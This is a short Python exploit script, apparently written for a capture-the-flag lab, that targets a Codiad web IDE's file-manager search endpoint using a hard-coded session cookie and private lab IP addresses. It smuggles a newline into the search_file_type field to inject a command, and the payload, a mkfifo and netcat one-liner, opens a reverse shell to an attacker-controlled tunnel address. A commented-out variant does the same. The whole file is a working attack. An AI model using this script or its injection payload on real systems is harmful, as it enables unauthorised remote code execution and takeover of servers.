import requests

IP = "10.10.110.240"
PORT = "62337"
TUN_IP = "10.11.8.57"
TUN_PORT = "4242"
url = f"http://{IP}:{PORT}/"

# copy cookie from your browser session
cookie = "f9c7294bc8f6035df784b56b800b122c=s410emkjqb8tsrdtp8pccjm1dk"
headers = {
    "Cookie": cookie,
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
}
s = requests.Session()

# http://10.10.110.240:62337/components/project/controller.php?action=get_current


def get_path():
    url_to_find_path = url + "components/project/controller.php?action=get_current"
    r = s.get(url_to_find_path, headers=headers).json()
    return r['data']['path']


current_path = "/var/www/html/codiad_projects"
vuln_url = url + \
    f"components/filemanager/controller.php?type=1&action=search&path={current_path}"

# payload = f'"%%0Anc {TUN_IP} {TUN_PORT}|/bin/bash %%23'
payload = '"%%0Arm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.8.57 4242 >/tmp/f'
# payload = "%%0A %%23"
payload = "search_string=Anonymous&search_file_type=" + payload

res = s.post(vuln_url, data=payload, headers=headers, verify=False)
print(res.text)
print(res.url)
